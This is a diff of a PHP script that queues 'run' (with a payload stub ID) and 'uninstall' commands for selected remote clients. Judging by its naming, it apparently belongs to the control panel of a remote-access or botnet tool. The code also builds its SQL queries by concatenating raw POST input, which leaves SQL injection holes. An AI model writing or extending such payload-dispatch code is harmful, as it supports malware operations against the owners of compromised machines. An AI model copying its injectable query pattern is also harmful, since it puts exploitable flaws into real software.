@@ -12,20 +12,31 @@ if(!isset($_POST['command']) || !isset($_POST['check']))
 
 $command = $_POST['command'];
 $clients = $_POST['check'];
-$stubid = $_POST['payload'];
 $succesMessage = "Executed ". $command . " on clients: ";
 
-foreach ($clients as $key => $id) {
-    $sql = "INSERT INTO command (Client_Id, Command, StubId) VALUES(" . $id . ", '".$command."', '".$stubid."') ON DUPLICATE KEY UPDATE Client_Id=$id, Command='$command', StubId=$stubid";
-    $dbconn->exec($sql);
+if($command == "run")
+{    
+    $stubid = $_POST['payload'];   
+    foreach ($clients as $key => $id) {
+        $sql = "INSERT INTO command (Client_Id, Command, StubId) VALUES(" . $id . ", '".$command."', '".$stubid."') ON DUPLICATE KEY UPDATE Client_Id=$id, Command='$command', StubId=$stubid";
+        $dbconn->exec($sql);
+        $succesMessage.= $id . ",";
+    }
 
-    $succesMessage.= $id . ",";
+    $succesMessage = substr_replace($succesMessage, "", -1);
+    $_SESSION['command-succes'] = $succesMessage;    
+}
+else if($command == "uninstall")
+{
+    foreach ($clients as $key => $id) {
+        $sql = "INSERT INTO command (Client_Id, Command) VALUES(" . $id . ", '".$command."') ON DUPLICATE KEY UPDATE Client_Id=$id, Command='$command'";
+        $dbconn->exec($sql);
+        $succesMessage.= $id . ",";
+    }
+    
 }
 
-$succesMessage = substr_replace($succesMessage, "", -1);
-
-$_SESSION['command-succes'] = $succesMessage;
-
 header('location: /');
+    die();
 
 ?>
